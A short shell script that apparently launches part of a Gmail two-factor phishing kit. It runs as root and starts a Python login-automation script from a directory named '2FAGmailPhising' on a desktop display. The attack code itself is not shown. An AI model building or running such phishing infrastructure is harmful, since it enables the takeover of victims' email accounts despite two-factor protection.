#!/bin/sh
# script that runs as root
# The display number must be a desktop session valid, you can view with echo $DISPLAY
export PATH=$PATH:/root/2FAGmailPhising/geckodriver
DISPLAY=:1 python /root/2FAGmailPhising/logingmail.py &
